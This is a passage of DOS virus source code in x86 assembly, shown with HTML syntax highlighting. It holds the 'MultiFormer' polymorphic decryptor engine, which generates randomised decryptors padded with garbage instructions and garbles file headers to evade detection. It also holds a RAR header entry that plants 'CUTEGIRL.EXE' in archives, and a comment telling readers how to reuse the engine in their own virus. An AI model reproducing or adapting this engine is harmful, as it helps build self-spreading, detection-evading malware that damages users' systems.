        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">; Required version of RAR archiver</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">30h</span><span class="sc0">          </span><span class="sc1">; Compression method</span><span class="sc0">
</span><span class="sc5">RAR_FNS</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MultiFormer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RARName</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000021h</span><span class="sc0">          </span><span class="sc1">; RAR file attributes</span><span class="sc0">
</span><span class="sc5">RARName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CUTEGIRL.EXE'</span><span class="sc0">      </span><span class="sc1">; Filename (without ASCIZ)</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ MULTIFORMER, fast-polymorphic generator ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; This  polymorphic  engine is a development of  existing  engine  created by</span><span class="sc0">
</span><span class="sc1">; GriYo (29A)  that has been  implemented on  CRI-CRI and IMPLANT.6128 virus.</span><span class="sc0">
</span><span class="sc1">; So, a ton of thanks go to him.</span><span class="sc0">
</span><span class="sc1">; Warning: This engine ain't a portable one, so don't attempt to copy &amp; paste</span><span class="sc0">
</span><span class="sc1">;          it into Your virus without any modification!!</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">MultiFormer</span><span class="sc4">:</span><span class="sc0">                        
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; Push file handle,</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Delta</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save delta offset before writing codes</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; and set ES = DS</span><span class="sc0">

</span><span class="sc5">Remix</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0009h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LowSiz</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">stosb</span><span class="sc0">                  </span><span class="sc1">; Clear some variables</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; Initialize random number engine</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; 0 (SI) or 1 (DI)?</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Store random displacement too</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3801h</span><span class="sc0">               </span><span class="sc1">; Choose decryptor type: forward (0) or backward</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; (1) and decryptor register</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Clear maximum counter for NEG/NOT  SP</span><span class="sc0">

</span><span class="sc5">AntiZero</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; This time, the encryption key</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">AntiZero</span><span class="sc0">               </span><span class="sc1">; ??</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">AntiZero</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Keybyte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)],</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Interplay</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0F8h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Mutant</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DIsk_IO</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">Altogether</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; Random word?</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Altogether</span><span class="sc0">             </span><span class="sc1">; Fill buffer with garbage</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; Restore pointer to buffer</span><span class="sc0">

</span><span class="sc5">Ripple</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Countermove</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Intervention</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">rol</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Rotate a bit to the left</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowSiz</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Ripple</span><span class="sc0">                 </span><span class="sc1">; Don't generate a "monomorphic" decryptor</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowSiz</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Intervention</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc5">Mutant</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">Remix</span><span class="sc0">                  </span><span class="sc1">; Buffer overflow? jump if yes, try again</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">       </span><span class="sc1">; Decryptor is ready?</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Ripple</span><span class="sc0">                 </span><span class="sc1">; Not yet</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Construction</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,((</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Vanguard</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBeg</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; So, a jump to entry point after decrypting</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; Restore file handle</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Mutant</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movsb</span><span class="sc0">                  </span><span class="sc1">; Copy decryptor from buffer into virus body</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Undress</span><span class="sc0">                </span><span class="sc1">; Garble file header.</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0E8h</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Strike</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Shallow</span><span class="sc0">

</span><span class="sc5">Shallow</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lahf</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Undress</span><span class="sc0">                </span><span class="sc1">; Ungarble file header</span><span class="sc0">
 </span><span class="sc6">sahf</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


                           </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Dum</span><span class="sc0"> </span><span class="sc5">spiro</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">spero</span><span class="sc0">!


</span><span class="sc5">Fractions</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Countermove</span><span class="sc0">     </span><span class="sc1">; \
 dw     offset Centralpoint    ;   \
 dw     offset Build_Cipher    ;    &gt; Five main parts of polymorphic decryptor</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Bombshell</span><span class="sc0">       </span><span class="sc1">;   /</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Countless</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">

</span><span class="sc5">Intervention</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Subroutine</span><span class="sc0">      </span><span class="sc1">; Subroutines creation</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Trash_Call</span><span class="sc0">      </span><span class="sc1">; "Worthless" calls</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Conditional</span><span class="sc0">     </span><span class="sc1">; A lot of "useless" conditional jumps</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Caller</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Total_Garbage</span><span class="sc0">   </span><span class="sc1">; A dumptruck of garbage</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Future_Generation</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Garbage_Stack</span><span class="sc0">   </span><span class="sc1">; Some trashes between PUSH and POP</span><span class="sc0">

</span><span class="sc5">Countermove</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; Make a MOV SI,XXXX or MOV DI,XXXX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resultant</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BootStrap</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Centralpoint</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; Create pointer to encrypted codes</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Total_Garbage</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">                
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resultant</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; SI or DI ?</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; LEA    BX,[BP + OFFSET BootStrap]</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Direction</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Ahead</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BootStrap</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">Ahead</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Displacement</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get memory addressing displacement</span><span class="sc0">
 </span><span class="sc6">cbw</span><span class="sc0"> 
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; This is invalid: XOR CS:[SI+80],CL</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Normal</span><span class="sc0">                 </span><span class="sc1">; the valid one is: XOR CS:[SI-80],CL</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc0">                     </span><span class="sc1">; So add 256 bytes</span><span class="sc0">

</span><span class="sc5">Normal</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Total_Garbage</span><span class="sc0">          </span><span class="sc1">; Fill with trashes</span><span class="sc0">
 
</span><span class="sc5">Build_Cipher</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; Generate decryptor instruction</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Nullify</span><span class="sc0">                </span><span class="sc1">; Don't generate a CALL to subroutine outside</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; decryption loop!</span><span class="sc0">
 </span><span class="sc6">jnp</span><span class="sc0">    </span><span class="sc5">Reggies</span><span class="sc0">                </span><span class="sc1">; Decide using a register or not</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Storage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Encryptor</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">imul</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">               </span><span class="sc1">; Integer: multiply by 3</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Encryptor</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                         </span><span class="sc1">; Load a decryptor</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Food</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Feed</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)],</span><span class="sc8">bh</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                 </span><span class="sc1">; ADC opcode?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Perceive</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                 </span><span class="sc1">; SBB opcode?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Eliminate</span><span class="sc0">

</span><span class="sc5">Perceive</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Decide</span><span class="sc0">                 </span><span class="sc1">; Choose either CLC or STC</span><span class="sc0">

</span><span class="sc5">Eliminate</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Compound</span><span class="sc0">               </span><span class="sc1">; Choose segment override</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; Indicate memory operation</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resultant</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Displacement</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Keybyte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)]</span><span class="sc0">
 </span><span class="sc6">neg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Reggies</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; Use immediate or memory referenced MOV ??</span><span class="sc0">
